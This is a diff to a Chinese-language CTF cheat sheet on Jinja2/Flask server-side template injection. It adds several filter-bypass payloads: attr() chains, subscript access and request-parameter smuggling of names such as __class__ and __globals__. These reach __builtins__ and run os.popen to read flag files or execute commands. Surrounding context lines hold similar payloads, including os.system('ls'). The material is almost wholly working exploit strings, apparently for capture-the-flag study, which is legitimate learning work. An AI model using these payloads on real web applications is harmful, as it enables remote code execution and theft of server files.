@@ -211,6 +211,12 @@ get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
 • os可以通过python中exec绕过
 如果过滤仅限于 request.args 但是不允许 post，简单的办法是可以用request.cookies来绕过
 ```
+### 绕过点.
+```python
+{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(64)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("cat /flag").read()')}}
+{{''['__class__']['__mro__'][-1]['__subclasses__']()[65]['__init__']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /flag')['read']()}}
+{{ ''['__class__']['__base__']['__subclasses__']()[96]['__subclasses__']()[0]['__subclasses__']()[0]('/flag').read() }}
+```
 ### 绕过[]
 ```python
 pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。
@@ -287,7 +293,7 @@ POST: class=__class__&mro=__mro__&subclasses=__subclasses__
 text={% if request.values.e[18] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[0]%}good{%endif%}&a=__class__&b=__base__&c=__subclasses__&d=/flag&e=}-{0123456789abcdefghijklmnopqrstuvwxyz
 ```
 ### 绕过关键字过滤
-```
+```python
 base64编码绕过
 __getattribute__使用实例访问属性时,调用该方法
 例如被过滤掉__class__关键词
@@ -354,8 +360,16 @@ print requests.get(url,cookies=cookies).text
 当然，我们也可以构造get的参数来传递：
 www.a.com/login.php{{''[request.args.clas][request.args.mr][2][request.args.subclas]()[40]('a.php').__getattribute__('rea'+'d')()}}
 ?clas=__class__&mr=__mro__&subclas=__subclasse__
-
 理论上，可以用这种方法绕过任何关键字过滤。更多请见参考5。
+```
+```python
+{{''.__class__}} => {{''[request.args.t1]}}&t1=__class__
+{{''.__class__}} => {{''[request['args']['t1']]}}&t1=__class__
+{{''.__class__}} => {{''|attr(request['values']['x1'])}}&t1=__class__
+
+url?name={{()|attr(request['values']['x1'])|attr(request['values']['x2'])| attr(request['values']['x3'])()|attr(request['values']['x6'])(233)| attr(request['values']['x4'])| attr(request['values']['x5'])| attr(request['values']['x6'])(request['values']['x7'])| attr(request['values']['x6'])(request['values']['x8'])(request['values']['x9'])}}
+
+x1=__class__&x2=__base__&x3=__subclasses__&x4=__init__&x5=__globals__&x6=__getitem__&x7=__builtins__&x8=eval&x9=__import__("os").popen('cat /fl4g|base64').read()
 ```
 ### base64编码绕过
 ```
